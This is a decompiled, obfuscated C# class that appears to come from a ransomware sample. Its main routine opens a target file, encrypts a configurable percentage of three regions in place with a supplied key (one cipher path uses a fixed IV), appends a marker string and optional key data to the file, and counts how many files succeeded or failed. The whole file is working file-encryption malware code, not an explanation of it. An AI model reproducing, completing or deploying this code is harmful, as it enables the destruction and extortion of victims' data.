using System;
using System.IO;
using System.Text;
using QFSLrCXCNYPIKJ;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace azCTgkmpGT;

internal sealed class WjbOIdEJgeh
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int MWxYgvXAIxWcgy(long long_0)
	{
		return (int)long_0;
	}

	public static bool eNKyKoZcjDOajb(string KWLMLGjNURBX, string BMgqqZAVAowh, string PZQZHCAWIA, byte[] CIfSnFgYcX = null, byte[] CwqUzYrLcHCf = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(KWLMLGjNURBX, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = MWxYgvXAIxWcgy(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(BMgqqZAVAowh) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(BMgqqZAVAowh) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(BMgqqZAVAowh) * 1024 * 1024) / 10;
				}
				int koFFhxqWDlEVtm = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] byte_ = wevPnLzEjTCCcH(KWLMLGjNURBX, fileStream, koFFhxqWDlEVtm, num * i);
					array = (cQHVlxVivZVq.OTLCmOpFsMP ? mLvAvjKKGJxbb.RlhTeYZQFxqeS(byte_, Convert.FromBase64String(PZQZHCAWIA), CwqUzYrLcHCf) : VbJxNITbKqkCPhG.QTulHfZYmae(byte_, Convert.FromBase64String(PZQZHCAWIA), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					XtQPMoDqxRi(KWLMLGjNURBX, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (cQHVlxVivZVq.UpNccIaFzBadyA ? Encoding.ASCII.GetBytes(cQHVlxVivZVq.sNXkawcfFmeqKOWI(getString_0(107378347)) + cQHVlxVivZVq.sNXkawcfFmeqKOWI(getString_0(107379875)) + Convert.ToString(BMgqqZAVAowh) + cQHVlxVivZVq.sNXkawcfFmeqKOWI(getString_0(107379875))) : Encoding.ASCII.GetBytes(cQHVlxVivZVq.sNXkawcfFmeqKOWI(getString_0(107378347)) + cQHVlxVivZVq.sNXkawcfFmeqKOWI(getString_0(107379852)) + Convert.ToString(BMgqqZAVAowh) + cQHVlxVivZVq.sNXkawcfFmeqKOWI(getString_0(107379852))));
			if (!cQHVlxVivZVq.UpNccIaFzBadyA)
			{
				using FileStream fileStream2 = new FileStream(KWLMLGjNURBX, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(KWLMLGjNURBX, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(CIfSnFgYcX, 0, CIfSnFgYcX.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (cQHVlxVivZVq.SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(cQHVlxVivZVq.bDDJFCkjBbYQ, getString_0(107399085) + KWLMLGjNURBX + getString_0(107378366) + ex.Message + getString_0(107395983));
				}
				catch (Exception)
				{
				}
			}
			cQHVlxVivZVq.ZzaknwGiCeEd++;
			return false;
		}
		cQHVlxVivZVq.DPjjDEUnrYJ++;
		return true;
	}

	public static byte[] wevPnLzEjTCCcH(string nyKpISTQnSyRXl, FileStream HjTkcBIyiukX, int koFFhxqWDlEVtm, int XSToTEUKnksCj = 0)
	{
		byte[] array = new byte[koFFhxqWDlEVtm];
		HjTkcBIyiukX.Position = XSToTEUKnksCj;
		HjTkcBIyiukX.Read(array, 0, koFFhxqWDlEVtm);
		return array;
	}

	public static void XtQPMoDqxRi(string UiJBVzmIOVeSd, FileStream QDSVcXymXyOGB, byte[] SXcZvzneOtHtd, int FNaWiJfYqANQ = 0)
	{
		QDSVcXymXyOGB.Position = FNaWiJfYqANQ;
		QDSVcXymXyOGB.Write(SXcZvzneOtHtd, 0, SXcZvzneOtHtd.Length);
	}

	static WjbOIdEJgeh()
	{
		Strings.CreateGetStringDelegate(typeof(WjbOIdEJgeh));
	}
}
